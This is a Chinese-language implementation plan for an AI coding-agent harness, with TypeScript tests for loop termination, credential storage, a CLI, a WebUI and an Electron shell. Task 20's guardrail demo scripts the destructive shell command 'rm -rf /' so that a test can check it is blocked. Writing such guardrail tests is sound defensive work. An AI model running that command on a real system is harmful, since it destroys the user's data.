  it('第 3 轮不升级（maxRounds=3 时最后一轮仍然执行）', () => {
    const rm = new RoundManager(3);
    rm.nextRound();
    rm.nextRound();
    expect(rm.currentRound).toBe(3);
    expect(rm.shouldUpgrade()).toBe(false);
  });

  it('第 4 轮（maxRounds+1）触发升级', () => {
    const rm = new RoundManager(3);
    rm.nextRound(); // 2
    rm.nextRound(); // 3
    rm.nextRound(); // 4
    expect(rm.currentRound).toBe(4);
    expect(rm.shouldUpgrade()).toBe(true);
  });

  it('reset 回到第 1 轮', () => {
    const rm = new RoundManager(3);
    rm.nextRound();
    rm.nextRound();
    rm.reset();
    expect(rm.currentRound).toBe(1);
    expect(rm.shouldUpgrade()).toBe(false);
  });

  it('自定义 maxRounds 下升级时机正确', () => {
    const rm = new RoundManager(5);
    for (let i = 0; i < 4; i++) rm.nextRound();
    expect(rm.currentRound).toBe(5);
    expect(rm.shouldUpgrade()).toBe(false);
    rm.nextRound();
    expect(rm.currentRound).toBe(6);
    expect(rm.shouldUpgrade()).toBe(true);
  });
});
```

- [ ] **步骤 4：实现 FailureClassifier + StrategyMatcher + RoundManager** → 通过以上所有测试 → 提交

提交：`feat: FailureClassifier + StrategyMatcher + RoundManager — feedback layers 4-5 complete`

---

### 任务 13a：停机判断器 ✅ — `237cfcc`

**涉及文件：**
- 创建：`src/core/termination.ts`
- 创建：`tests/unit/core/termination.test.ts`

**产出：** `termination.check(response, round, maxRounds)` 函数，判断 agent 是否应停止循环。

**完成条件：** `npx vitest run tests/unit/core/termination.test.ts` 全部通过；所有测试使用 MockProvider 的确定性输出，不依赖真实 LLM。

- [ ] **步骤 1：停机判断器 TDD**

`tests/unit/core/termination.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { shouldTerminate } from '../../../src/core/termination.js';
import type { LLMResponse } from '../../../src/types.js';

describe('shouldTerminate', () => {
  it('LLM 输出无 tool call → 完成', () => {
    const resp: LLMResponse = { content: '任务已完成。' };
    expect(shouldTerminate(resp, 1, 3)).toBe(true);
  });

  it('有 tool call → 未完成', () => {
    const resp: LLMResponse = {
      content: null,
      toolCalls: [{ name: 'read_file', arguments: { path: 'test.ts' } }],
    };
    expect(shouldTerminate(resp, 1, 3)).toBe(false);
  });

  it('FINISHED 工具调用 → 完成', () => {
    const resp: LLMResponse = {
      content: null,
      toolCalls: [{ name: 'FINISHED', arguments: {} }],
    };
    expect(shouldTerminate(resp, 1, 3)).toBe(true);
  });

  it('超过 maxRounds → 完成（升级触发）', () => {
    const resp: LLMResponse = {
      content: null,
      toolCalls: [{ name: 'write_file', arguments: { path: 'a.ts', content: 'x' } }],
    };
    expect(shouldTerminate(resp, 4, 3)).toBe(true);
  });

  it('第 maxRounds 轮仍在执行', () => {
    const resp: LLMResponse = {
      content: null,
      toolCalls: [{ name: 'write_file', arguments: { path: 'a.ts', content: 'x' } }],
    };
    expect(shouldTerminate(resp, 3, 3)).toBe(false);
  });
});
```

运行：`npx vitest run tests/unit/core/termination.test.ts` → FAIL。

- [ ] **步骤 2：实现停机判断器** → 通过测试 → 提交

提交：`feat: termination checker — deterministic stop-condition logic`

---

### 任务 13b：Agent 主循环 + 集成测试 ✅ — `03c6c97` + CR fix `c13bfa3`

**涉及文件：**
- 创建：`src/core/main-loop.ts`
- 创建：`tests/integration/main-loop.test.ts`

**产出：** 完整 `AgentLoop.run()`——遵循 SPEC §3.1 伪代码，编排 LLM → 解析 → 护栏 → 执行 → 反馈 → 回灌 → 循环。每步发出 HarnessEvents。

**完成条件：** `npx vitest run tests/integration/main-loop.test.ts` 3 个集成测试全部通过；所有测试使用 MockProvider，零网络调用；`npx vitest run` 全项目测试通过。

- [x] **步骤 1：编写集成测试（先红）**

`tests/integration/main-loop.test.ts`：

```typescript
import { describe, it, expect } from 'vitest';
import { AgentLoop } from '../../src/core/main-loop.js';
import { MockProvider } from '../../src/llm/mock-provider.js';
import { createToolRegistry } from '../../src/tools/tool.js';
import { ReadFileTool } from '../../src/tools/read-file.js';
import { WriteFileTool } from '../../src/tools/write-file.js';
import { ActionClassifier } from '../../src/feedback/action-classifier.js';
import { ValidatorSelector } from '../../src/feedback/validator-selector.js';
import { ValidatorChain } from '../../src/feedback/validator-chain.js';
import { FailureClassifier } from '../../src/feedback/failure-classifier.js';
import { StrategyMatcher } from '../../src/feedback/strategy-matcher.js';
import { RoundManager } from '../../src/feedback/round-manager.js';
import { PatternGuard } from '../../src/guardrail/pattern-guard.js';
import { ScopeFence } from '../../src/guardrail/scope-fence.js';
import { HITLManager } from '../../src/guardrail/hitl-manager.js';
import { SessionMemory } from '../../src/memory/session-memory.js';
import { createEventBus } from '../../src/events.js';
import { DEFAULT_CONFIG } from '../../src/config/schema.js';

function createTestHarness(mockResponses: any[]) {
  const mockLLM = new MockProvider(mockResponses);
  const tools = createToolRegistry();
  tools.register(new ReadFileTool());
  tools.register(new WriteFileTool());
  const events = createEventBus();
  const memory = new SessionMemory();
  const guard = {
    patternGuard: new PatternGuard(),
    scopeFence: new ScopeFence('/tmp/test-workspace'),
    hitl: new HITLManager(),
  };
  const feedback = {
    classifier: new ActionClassifier(),
    selector: new ValidatorSelector(),
    chain: new ValidatorChain(),
    failureClassifier: new FailureClassifier(),
    strategyMatcher: new StrategyMatcher(),
    roundManager: new RoundManager(3),
  };
  return new AgentLoop(mockLLM, tools, guard, feedback, memory, events, DEFAULT_CONFIG);
}

describe('Agent Main Loop (integration)', () => {
  it('简单任务：读取文件后完成', async () => {
    const harness = createTestHarness([
      { toolCalls: [{ name: 'read_file', arguments: { path: 'test.ts' } }] },
      { content: '任务已完成。文件已读取。' },
    ]);
    const session = await harness.run('读取 test.ts 文件');
    expect(session.status).toBe('completed');
    expect(session.messages.length).toBeGreaterThan(0);
  });

  it('解析错误恢复：收到垃圾 JSON 后正确重试', async () => {
    const harness = createTestHarness([
      { content: 'not valid json {{{}' },
      { toolCalls: [{ name: 'read_file', arguments: { path: 'test.ts' } }] },
      { content: 'done' },
    ]);
    const session = await harness.run('读取文件');
    const feedbackMessages = session.messages.filter(m => m.role === 'feedback');
    expect(feedbackMessages.some(f => f.metadata?.feedbackResult?.failureCategory === 'parse_error')).toBe(true);
    expect(session.status).toBe('completed');
  });

  it('MaxRounds 升级：4 轮类型错误后触发 HITL', async () => {
    const harness = createTestHarness([
      { toolCalls: [{ name: 'write_file', arguments: { path: 'test.ts', content: 'const x: number = "str"' } }] },
      { toolCalls: [{ name: 'write_file', arguments: { path: 'test.ts', content: 'const x: number = "str2"' } }] },
      { toolCalls: [{ name: 'write_file', arguments: { path: 'test.ts', content: 'const x: number = "str3"' } }] },
      { toolCalls: [{ name: 'write_file', arguments: { path: 'test.ts', content: 'const x: number = "str4"' } }] },
    ]);
    const session = await harness.run('修复 test.ts 的类型错误');
    expect(session.currentRound).toBe(4);
    expect(session.messages.some(m => m.metadata?.approvalRequired === true)).toBe(true);
  });
});
```

运行：`npx vitest run tests/integration/main-loop.test.ts` → FAIL（AgentLoop 类未定义）。

- [x] **步骤 2：实现 Agent 主循环**——遵循 SPEC §3.1 伪代码 → 通过集成测试 → 提交

提交：`feat: agent main loop with full MockProvider integration tests`

---

### 任务 14：CredentialBackend 实现 ✅ — `04bd2be`

**涉及文件：**
- 创建：`src/credentials/backends/backend.ts`、`keytar-backend.ts`、`encrypted-file-backend.ts`、`env-backend.ts`
- 创建：`tests/unit/credentials/keytar-backend.test.ts`、`encrypted-file-backend.test.ts`、`env-backend.test.ts`

**产出：** `CredentialBackend` 接口 + 3 个实现。

- [ ] **步骤 1：CredentialBackend 接口**——`isAvailable()`、`save()`、`read()`、`delete()`、`exists()` 方法
- [ ] **步骤 2：KeytarBackend TDD**——mock keytar 模块，测试 CRUD 操作，测试 isAvailable
- [ ] **步骤 3：EncryptedFileBackend TDD**——使用 Node.js `crypto`（AES-256-GCM + PBKDF2），文件位于 `~/.codeharness/secrets.enc`，测试 save→文件已加密，read→返回原始值，错误密码→失败
- [ ] **步骤 4：EnvBackend TDD**——从 `process.env` 读取，环境变量存在时 isAvailable 为 true，save 抛出异常（只读）
- [ ] **步骤 5：运行所有凭据测试 → 通过，提交**

提交：`feat: 3 CredentialBackend implementations (keytar, encrypted file, env)`

---

### 任务 15：CredentialStore + SecureHandle ✅ — `262560a`

**涉及文件：**
- 创建：`src/credentials/store.ts`、`src/credentials/secure-handle.ts`
- 创建：`tests/unit/credentials/store.test.ts`

**产出：** `CredentialStore` 带后端优先级链 + `SecureHandle` 安全密钥使用。

- [ ] **步骤 1：SecureHandle TDD**——封装 key，`use(fn)` 将 key 传入闭包，闭包外 key 不可达 → 实现 → 通过
- [ ] **步骤 2：CredentialStore TDD**——后端链（keytar → encrypted_file → env）；使用第一个可用的；keytar 不可用 → 降级；get 返回 SecureHandle 而非裸字符串；状态显示脱敏 key（后 4 位）
- [ ] **步骤 3：提交**

提交：`feat: CredentialStore with backend priority chain + SecureHandle`

---

### 任务 16：CLI + Key 管理 ✅ — `d3c2bdf` + CR fix `13536ba`

**涉及文件：**
- 创建：`src/cli/index.ts`、`src/cli/commands/start.ts`、`src/cli/commands/key.ts`、`src/cli/commands/config.ts`

**产出：** CLI 入口，命令：`start`、`key status|update|reset`、`config show`。

- [x] **步骤 1：CLI 脚手架**——commander 程序，含名称/版本
- [x] **步骤 2：Key 管理命令**——`key status`（脱敏显示）、`key update`（隐藏输入提示）、`key reset`
- [x] **步骤 3：Config 显示**——打印合并后的配置，key 脱敏
- [x] **步骤 4：Start 命令**——`start <task>` 初始化会话，运行主循环，将消息输出到 stdout
- [x] **步骤 5：提交**

提交：`feat: CLI with start, key management, and config commands`

---

### 任务 17：WebUI——Express 服务器 + API 路由

**涉及文件：**
- 创建：`src/webui/server.ts`
- 创建：`src/webui/api/sessions.ts`、`approvals.ts`、`keys.ts`、`config.ts`
- 创建：`tests/integration/webui-api.test.ts`

**产出：** Express + WebSocket 服务器监听 `config.webui.port`，REST API 处理 sessions/approvals/keys/config，WebSocket 事件广播。

- [x] **步骤 1：Express + WebSocket 脚手架**——HTTP 服务器、同端口 WSS、JSON 中间件（commit `319c72a9`，CR 修复 `6fe864d`）
- [x] **步骤 2：REST API 路由**——POST/GET `/api/sessions`、GET `/api/sessions/:id`、POST message/pause/resume/stop、POST `/api/approvals/:id`（approve/modify/deny）、GET/POST/DELETE `/api/keys/:provider`、GET/PUT `/api/config`（PUT 拒绝密钥字段，§3.6）
- [x] **步骤 3：WebSocket 广播**——将所有 HarnessEvents 转发到连接的客户端，按 `sessionId` 查询参数过滤
- [x] **步骤 4：API 集成测试**——使用 supertest 测试 HTTP，ws 测试 WebSocket（31 用例，413/413 全绿）
- [x] **步骤 5：提交**

提交：`feat: WebUI Express server + REST API + WebSocket event broadcast`

---

### 任务 18a：WebUI——Open Design 设计 + 项目脚手架 + Dashboard + Settings

**涉及文件：**
- 创建：`src/webui/client/`——Vite + React 项目（使用 `npm create vite@latest` 脚手架）
- 创建：`src/webui/client/src/design-tokens.ts`（Open Design 导出）
- 创建：页面：`Dashboard.tsx`、`Settings.tsx`

初始化：`npm create vite@latest . -- --template react-ts`，安装 `@monaco-editor/react`、`lucide-react`、shadcn/ui（tailwind）。

**完成条件：** `npm run build`（在 client 目录下）无报错；Dashboard 页面渲染正常；Settings 页面渲染正常；所有颜色/字号/间距引用 `design-tokens.ts` 中的变量，无硬编码值。

- [x] **步骤 0：使用 Open Design 桌面应用设计 UI**——在编写任何 React 代码之前（commit `f5aaffc`）：
  1. 完成（人工）：需求文档 `DESIGN_BRIEF.md` → Open Design AI 设计三页
  2. 完成：可视化设计三页（Dashboard、SessionDetail、Settings）的布局、颜色方案、间距系统、组件 spec
  3. 完成：导出设计 token 为 `src/webui/client/src/design-tokens.ts`（颜色/字体/间距/圆角/阴影，语义命名）
  4. 此文件是后续 subagent (18a, 18b) 生成所有 React UI 代码的**约束源**——所有组件必须引用此 token 文件中的变量，不得硬编码颜色/字号/间距（测试断言 token 引用值验证）

- [x] **步骤 1：Dashboard**——活跃会话列表（状态/任务/运行时长/token 数），"新建会话"按钮 → POST /api/sessions（commit `ce8627e`）
- [x] **步骤 2：Settings**——key 管理（脱敏显示、更新/删除），Monaco JSON 配置编辑器（带 schema 校验），配置预览
- [x] **步骤 3：提交**（31 client 测试 + 413 main 全绿；无硬编码 grep 零命中）

提交：`feat: WebUI project scaffold + Open Design tokens + Dashboard + Settings`

---

### 任务 18b：WebUI——SessionDetail + 核心组件

**涉及文件：**
- 创建：页面：`SessionDetail.tsx`
- 创建：组件：`MessageList.tsx`、`ApprovalCard.tsx`、`FileDiff.tsx`

**依赖**：Task 18a（需要 Vite 项目脚手架和 design-tokens.ts 已就位）

**完成条件：** `npm run build` 无报错；SessionDetail 页面三栏布局正确；MessageList 可展开 tool call、绿色/红色反馈标记；ApprovalCard 含批准/编辑/拒绝按钮；FileDiff 使用 Monaco Editor 展示 diff；所有样式引用 `design-tokens.ts`。

- [x] **步骤 1：SessionDetail（核心页面）**——3 栏布局：文件变更 | 消息流 | 上下文信息。MessageStream 含可展开的 tool call、绿色/红色反馈标记。内联 HITL `ApprovalCard`（批准/编辑/拒绝）。Monaco `FileDiff` 展示 agent 文件变更。底部消息输入框。页面头部：暂停/恢复/停止按钮（commit `184b682`；WS 实时驱动，6 种事件 → 纯 reducer 状态机，id 去重）
- [x] **步骤 2：提交**（client 115/115 + 主项目 413/413 全绿；build 通过；无硬编码 grep 零命中）
- [x] **步骤 3：原型完全复刻 + 用户反馈修复**（commit `ab7a932`，主 agent 直接实现）：
  1. 完全复刻 `Web-Prototype/codeharness-webui.html`：TopBar segmented tabs + ws 状态胶囊 + 搜索框；Dashboard 统计卡/筛选器/行操作/原型空态；SessionDetail mini-tabs/用户气泡/系统 pill/tool-arg/HITL 卡/停止 modal/上下文 5 区；Settings 导航/editor-bar/danger-zone
  2. **maxRounds 无上限**：原先 POST /api/sessions 静默丢弃 maxRounds（固定 3）——修复为透传；`RoundManager`/`shouldTerminate` 支持 `0 = 无上限`；WebUI 新建会话默认无上限，可勾选限制轮次（client 120/120 + 主项目 419/419）
  3. Settings 新增「模型与护栏」「通用」板块（真实 config 数据）；删除装饰头像
  4. 修复 TopBar `isActive` 未定义白屏 bug + 新增 App.test.tsx 防回归

---

### 任务 19：完整集成——CLI `--web` + Agent 循环

**涉及文件：**
- 修改：`src/cli/commands/start.ts`——增加 `--web` 标志
- 创建：`tests/integration/full-loop.test.ts`

- [x] **步骤 1：接入 `--web` 标志**——在同一进程中同时启动 agent 循环和 Express 服务器（commit `860336b`：`createWebHarness` 复用 createWebUIServer 注入模式；onSessionCreated/onApprovalResolved/onSessionResumed/onSessionControl 集成接缝；共享 HITLManager/事件总线/凭据库；`dev-webui.ts` 保留为无凭据前端 dev 入口）

**需求备注（Phase 10 收尾时用户决策）**：会话级工作目录绑定（"打开/新建项目"）统一在 Task 19 实现——✅ 全部落地（commit `860336b`）：
- ✅ `Session` 增加 `workspaceRoot` 字段（当前为全局 `config.agent.workspaceRoot`，会话无项目绑定）
- ✅ `POST /api/sessions` 接受并校验 workspaceRoot（绝对路径/存在/目录三重校验 + 400；7 种非法输入测试；1.6 真实测试跟进：移除「可写」检查——Windows `fs.access` 不查 ACL，`C:\Windows` 恒过 W_OK，纸面限制只制造与选择器（任意目录可选）的不一致；不可写根合法，树加载失败可见报错 + 工具层 isWithinWorkspace 兜底）；`SessionStore.create` 支持
- ✅ `AgentLoop.run` 按会话 workspaceRoot 构建 ToolContext/验证器 cwd/scope-fence 基准（run(options) 会话 > 显式参数 > config 回退链）
- ✅ WebUI 新建会话 modal 加「工作目录」字段（默认当前 workspaceRoot）；会话详情显示项目路径
- ⬜ CLI `start` 加 `--cwd` 选项（可选增强，未实现——start.ts 注释注明）
- ✅ 安全面：越界护栏按会话基准（越界写拦截测试证明 config 根不受影响）；已知限制：scope-fence 词法路径校验的符号链接局限（Task 8 既有，注释注明）、单会话并发 HITL 键控（注释注明）
- [x] **步骤 2：使用 MockProvider 进行完整集成测试**——`tests/integration/full-loop.test.ts`（真实 Express + WS + AgentLoop，仅 LLM MockProvider）：① 完成闭环；② HITL warn → API 批准 → 继续 → completed（+ 修复后新增：同进程第二次 warn 批准）；③ 反馈失败 3 次 → 升级暂停 → 批准后提高上限恢复（maxRounds = currentRound + maxRounds）→ completed；④ pause/resume/stop 真实控制（AbortSignal 轮级取消）
- [x] **步骤 3：运行全部测试**——主项目 436/436 + client 123/123 + tsc + 双 build 通过（commit `d411349` 为两阶段评审修复：C1 HITL 回 IDLE / I1 升级恢复 / I2 控制端点真实化 / M1 --help 退出码）
- [x] **步骤 4：提交**
- [x] **步骤 5：真实 LLM 全流程测试 + 用户在场监督模式**（2026-08-02~03，用户主导测试 32 commits `be7c51a`~`c31bddc`）：
  1. 真实 API 协议修复 4 个（schema 转换 / tool_call_id 链路 / feedback 角色 / 配对顺序稳定化）
  2. Windows 环境适配（run_shell 用 Git Bash；eslint/tsc 前提跳过）；WS 广播截断；前端 flex/line-height/批准卡持久化/SystemCard
  3. **用户在场监督模式（用户决策，Claude Code 式）**：工作区外读写 + 敏感路径 → 确认卡（WebUI）/ stdin 交互（CLI）；批准后**工具消息原地替换为真实执行结果**（LLM 只见正常工具结果，零中间态噪音）；已批准命令记忆防重复确认
  4. completed 会话消息注入恢复；maxRounds 默认无上限（参照 Claude Code --max-turns 默认 Unlimited）；config PUT 深度密钥拒绝 + 精确报错
  5. 验证：主项目 449/449 + client 123/123 + 双 build；CLI 2.1-2.4 / WebUI 3.1-3.6 / 会话级工作目录 / 安全验证全部通过

提交：`feat: full integration — CLI --web mode, agent loop + WebUI in single process`（`860336b` + 评审修复 `d411349` + 真实测试 32 commits）

---

### 任务 20：机制演示（§A.6）

**涉及文件：**
- 创建：`tests/demo/guardrail-demo.test.ts`
- 创建：`tests/demo/feedback-demo.test.ts`
- 创建：`tests/demo/deep-dimension-demo.test.ts`

- [ ] **步骤 1：演示 1——护栏拦截**——MockProvider 返回 Action(run_shell, "rm -rf /") → PatternGuard.check() 返回 { blocked: true, level: 'block' } → 命令绝不执行 → agent 收到拦截通知。零网络调用。
- [ ] **步骤 2：演示 2——反馈闭环自我修正**——MockProvider 注入 3 个响应：类型错误 → 语法错误 → 正确代码。断言 RoundManager 正确递增，每轮产生正确的 FeedbackResult，agent 在第 3 轮完成。
- [ ] **步骤 3：演示 3——主力维度确定性行为**——完整链路：ActionClassifier（file_write → file_write）→ ValidatorSelector（file_write → [eslint, tsc]）→ ValidatorChain fail_fast（eslint 失败 → tsc 跳过）vs collect_all（eslint 失败 → tsc 仍调用）→ FailureClassifier（eslint → syntax, tsc → type）→ StrategyMatcher（syntax → auto_fix）→ RoundManager（3 次失败 → shouldUpgrade）。所有断言均不依赖任何 LLM/HTTP/I/O。
- [ ] **步骤 4：运行演示测试** → `npx vitest run tests/demo/` → 全部 3 个通过，零网络调用。

提交：`feat: mechanism demonstrations — guardrail, feedback loop, deep dimension (all mock-LLM deterministic)`

---

### 任务 21：Docker + npm 分发

**涉及文件：**
- 创建：`Dockerfile`、`.dockerignore`
- 修改：`package.json`（添加 `files`、`publishConfig`）

- [x] **npm link 部分已落地**（2026-08-05，Task 29——`npm link` 全局 `codeharness` 命令，bin/shebang 已就位零代码；npm publish 仍未做，维持待办）
- [ ] **步骤 1：Dockerfile**——FROM node:20-alpine, COPY package*.json, RUN npm ci --omit=dev, COPY dist/, EXPOSE 3000, ENTRYPOINT node dist/cli/index.js
- [ ] **步骤 2：.dockerignore**——排除 node_modules、tests、.git、.env、secrets、*.cred
- [ ] **步骤 3：npm 配置**——`"files": ["dist/", "README.md", "LICENSE"]`，`"publishConfig": {"access": "public"}`（npm publish 待办）
- [ ] **步骤 4：构建并验证**——`npm run build && docker build -t codeharness . && docker run --rm codeharness --version`
- [ ] **步骤 5：CI 更新**——在 `.github/workflows/ci.yml` 中添加 `docker-build` job
- [ ] **步骤 6：提交**

提交：`feat: Docker + npm distribution with CI docker-build job`

---

### 任务 22：文档

**涉及文件：**
- 创建/完成：`README.md`

- [x] **已完成**（2026-08-05，Task 33 落地——README.md 由分发专项实施：项目概述、安装（npm link + 桌面应用）、快速开始、key 配置指南、WebUI 说明、目录结构、安全边界、已知限制；commits `9d241c8` `946386c`）

提交：`docs: README`

---

### 任务 23：fs 浏览端点 + 目录选择器 + 会话详情文件树

**背景**：新建会话工作目录需手动输入路径（不便）；会话详情左栏只显示文件变更（希望显示工作目录文件树）。

**涉及文件：**
- 创建：`src/webui/api/fs.ts`——`GET /api/fs/tree?path=<dir>` 枚举目录树（含文件大小/类型；越界拦截——仅限授权的工作目录；深度限制防爆炸）
- 修改：`src/webui/server.ts`（挂载 fs 路由）
- 前端：`SessionDetail.tsx` 左栏改为**工作目录文件树**（可展开目录 + 文件变更高亮标记）；新建会话 modal 工作目录字段加**图形化选择器**（弹窗浏览目录树，点击选择）

**完成条件：** fs 端点返回目录树（含嵌套目录、文件类型/大小）；越界路径 400；前端文件树可展开/折叠；目录选择器弹窗可选目录并回填输入框；全部 Mock 测试（API 用临时目录 fixture）。

- [x] **已完成**（commit `9bba87c` + 评审修复 `3f0ee53`，主项目 463 + client 131）——fs 端点（嵌套/大小/排序、realpath 边界、symlink 拒绝、深度 4/每层 200/全局 5000 节点截断）；目录选择器弹窗（懒加载/回填/Escape 关闭）；会话详情文件树（展开折叠 + A/M 标记 + 变更文件 fallback 列表 + diff 预览）
- [x] **整机浏览增强**（commit `e5f88e8`，主项目 525 + client 177）——用户真实测试需求"选择整台电脑的任何目录"：新增 `GET /api/fs/browse` 无授权浏览端点（无 path → 机器根：Windows 盘符 / POSIX `/`；逐级枚举仅**元数据**：名称/类型/大小；symlink 标 `link` 不跟随；每层 200 截断）；`/tree` 保持授权根不变；前端选择器切换为 browse（机器根起始 + 逐级懒加载 + 选中回填）；KNOWN_ISSUES 记录元数据-only 安全取舍

### 任务 24：MD 渲染 + 移除搜索框

**背景**：AI 输出的 markdown 应以渲染预览显示；右上角搜索框无功能应删除。

**涉及文件：**
- 修改：`src/webui/client/src/components/MessageList.tsx`——assistant 消息用 **react-markdown** 安全渲染（样式对齐 design-tokens：代码块/表格/列表/行内代码；禁用危险 HTML——防 XSS）
- 修改：`src/webui/client/src/App.tsx`——移除搜索框

**完成条件：** assistant 消息的 markdown（标题/代码块/表格/列表/行内 code/链接）渲染正常且样式与 tokens 一致；`dangerouslySetInnerHTML` 零使用（XSS 审计）；搜索框从 TopBar 移除；client 测试更新（MD 渲染断言 + 移除搜索框断言）。

- [x] **已完成**（commit `b53df7a` + XSS URL 测试 `c2a63cc`，client 136 + 主项目 463）——react-markdown skipHtml 安全渲染（HTML 禁用 + URL 协议剥除 + 图片 alt 化，XSS 三类入口全测）；user 保持纯文本；搜索框移除

### 任务 25：自定义供应商 + 模型/护栏可编辑

**背景**：API Keys 仅三家供应商（需支持任意自定义供应商）；设置"模型与护栏"只读（需可直接修改并同步配置）。

**涉及文件：**
- 修改：`src/webui/api/keys.ts`——新增 `GET /api/keys`（枚举凭据库中已配置的 provider）
- 修改：`src/webui/client/src/pages/Settings.tsx`——API Keys 支持"添加供应商"（输入名称 → 新增 key 行）；「模型与护栏」卡片改**可编辑表单**（model/maxTokens/maxRounds/contextThreshold/guardrails 开关）→ 保存走 PUT /api/config（沿用深度密钥拒绝）

**完成条件：** 任意 provider 名可添加并保存 key（keytar 通道，掩码显示）；重启后自定义 provider 仍在（从凭据库枚举）；模型/护栏编辑保存后 config show 反映变更；密钥字段仍被拒绝（回归测试）；client 测试更新。

- [x] **已完成**（commit `cc8b703` + 评审修复 `ab497ac`，主项目 481 + client 147）——GET /api/keys 凭据库枚举（CredentialBackend.list）；动态 provider 列表 + 添加供应商（URL 编码 + 名校验）；模型/护栏可编辑表单（PUT config 白名单）；**护栏配置接入运行时**（Config.guardrails：blockOutbound 网络外呼确认 / requireApproval 规则匹配确认——真实生效，非写死旋钮）

### 任务 26：对话中切换模型

**背景**：切换模型应便捷（对话中即可），不必每次改配置。

**涉及文件：**
- 修改：`src/types.ts`（Session 增加 `model?: string`）、`src/webui/session-store.ts`（create 支持 model）
- 修改：`src/webui/api/sessions.ts`（POST 接受可选 model）
- 修改：`src/cli/commands/start.ts`（runSession 构建 provider 时**会话级 model 覆盖** config.llm.model）
- 修改：`src/webui/client/src/pages/SessionDetail.tsx`（上下文栏/头部加**模型选择器**：默认 + 自定义输入；切换 → PATCH session.model + 运行中重启当前 run——复用消息注入的 abort+restart 机制）
- 修改：`src/webui/api/sessions.ts`（新增 PATCH /:id 或复用 POST message 机制更新 model）

**完成条件：** 会话详情可切换模型（下拉默认模型 + 自定义输入）；切换后 agent 下一轮用新模型（provider 构造验证——可注入 spy）；运行中切换：abort 当前 run → 新模型重启 → 继续；CLI 会话不受影响（无 session.model 时用 config）；Mock 测试覆盖。

- [x] **已完成**（commit `9743b5f` + 评审修复 `9422977`，主项目 495 + client 166）——Session.model 全链路 + PATCH /:id/model（WS session:updated 按会话过滤）；BuildAgentLoopOptions.session → createLLMProvider model 参数（CLI 结构性回退 config）；运行中切换复用 abort+restart（finally 加 running 守卫防 pause 竞态；restartLiveRun helper）；前端上下文栏模型选择器（默认/历史/自定义 + 清除覆盖）

### 任务 27：CLI 交互式 REPL

**背景**：CLI 启动/对话需手动输入完整命令（不便）

**涉及文件：**
- 修改：`src/cli/index.ts`、`src/cli/commands/start.ts`——无参数启动进入 **REPL**（readline 交互循环：提示符 → 输入任务 → 运行 agent → 流式输出 → 等待下一条指令 → **消息注入**（复用 onMessageAdded 机制）→ 继续；`/exit`、`/help` 等斜杠命令）
- 复用：CLI 交互确认（stdin y/n）、已批准命令记忆、会话级 workspaceRoot

**完成条件：** `codeharness`（无参数）进入 REPL；输入任务即运行；运行中可输入新指令（注入下一轮）；HITL 确认在 REPL 内交互；`/exit` 退出、`/help` 列出命令；REPL 逻辑可注入测试（MockProvider 确定性）。

- [x] **已完成**（commit `051e052` + 评审修复 `b5b5efe`，主项目 520 + client 166）——无参数进 REPL；单会话持久 reader（管道不丢行）；首输入=任务、后续=消息注入（hitl.reset + maxRounds 上调 + 每轮新 loop 带 session 保 model 覆盖）；斜杠命令（/exit /help /model /clear）；Ctrl+C 三态（提示符退出/运行中中断/HITL 确认中断）；EOF 退出码镜像 start（非 completed → 1）；凭据隔离（缺 key 抛可操作错误）；24 个确定性测试

---

### 任务 28：生产模式静态服务（server staticDir + SPA fallback）✅ — `006d448`

**背景**：CLI/WebUI 启动需手动输入命令（不便）——分发专项（桌面应用 + 全局命令）第 1 层底座：`codeharness start --web` 单命令即可浏览器使用完整 WebUI。

**涉及文件：**
- 修改：`src/webui/server.ts`（`WebUIServerDeps.staticDir` + 静态挂载 + SPA fallback）
- 创建：`tests/integration/webui-static.test.ts`

- [x] **已完成**（commit `006d448`，主项目 627/627）——staticDir 可注入；`express.static` 挂在 `/api` 404 兜底**之后**（`/api/*` 永不落入 fallback，即使 build 产物含 api/ 目录）；SPA fallback 仅 GET（react-router 深链回 index.html，sendFile 错误走 error handler）；staticDir 缺省保持 API-only（开发模式 Vite 5173 不受影响）；4 集成测试（fixture 临时目录模拟 build 产物，不依赖真实构建）

### 任务 29：--web 生产模式接线 + dist 缺失报错 + npm link ✅ — `90e3778` `c4d7724`

**背景**：生产模式接线——`resolveStaticDir`（显式参数 → `CODEHARNESS_WEBUI_DIR` env → 项目根 `src/webui/client/dist`，`import.meta.url` 上溯**不依赖 process.cwd()**——npm link 后 `codeharness` 在任意目录运行）；dist 缺失明确失败（构建指引）；`npm link` 全局命令（bin/shebang 已就位，零代码）。

**涉及文件：**
- 修改：`src/cli/commands/start.ts`（`resolveStaticDir` 导出 + createWebHarness 校验/接线）
- 修改：`tests/integration/full-loop.test.ts`（makeHarness fixture staticDir 自给自足——CI 不构建 client，修复了隐式依赖真实构建产物的 CI 回归）

- [x] **已完成**（commits `90e3778` `c4d7724`，主项目 630/630）——3 harness 级测试（env 覆盖 / fixture 静态页 / dist 缺失报错）+ resolveStaticDir 单测；`codeharness --version` 任意目录可用（npm link 已验证）

### 任务 30：desktop/ 脚手架 + 主进程纯函数 ✅ — `cbe0a40`

**背景**：Electron 桌面壳（分发专项第 3 层）第 1 步——**纯逻辑与 electron 解耦**（依赖注入，单测不启动 Electron，CI 不装 Electron）。

**涉及文件：**
- 创建：`desktop/`（独立 package：package.json、tsconfig.json CJS、vitest.config.ts）
- 创建：`desktop/src/lifecycle.ts`（`resolveBackendDir` / `buildBackendCommand` / `waitForPort` / `killProcessTree` 纯函数）
- 修改：根 `.gitignore`（+`desktop/build/`、`desktop/node_modules/`）

- [x] **已完成**（commit `cbe0a40`，desktop 6/6 单测）——独立 package（electron 依赖不污染主项目）；spawn 命令构造含 `CODEHARNESS_WEBUI_DIR` env；端口轮询（fetch 注入）；进程树清理（taskkill /T /F，spawnFn 注入）；Windows 路径断言用 path.join 构造

### 任务 31：Electron 生命周期 + main 接线 ✅ — `0d5fdf9` `d2203dc`

**背景**：主进程生命周期——短探 :3000 就绪 → 直接开窗不重复 spawn；未就绪 → spawn 后端（生产模式）→ 轮询 30s → BrowserWindow；超时 → showError + **onExit（防僵尸应用）**；窗口关闭 → kill 进程树 + 退出。

**涉及文件：**
- 创建：`desktop/src/lifecycle.ts`（追加 `runDesktopLifecycle` 注入式编排）
- 创建：`desktop/src/main.ts`（唯一 import electron 的薄接线层；`app.isPackaged` 分支）

- [x] **已完成**（commits `0d5fdf9` `d2203dc`，desktop 11/11 单测）——评审修复：`intentional` 标志（主动关闭不误弹「后端已退出」框——Windows 强杀 exit code ≠ 0）/ 超时分支 close 杀已 spawn 进程（防孤儿）/ spawn null 立即报错

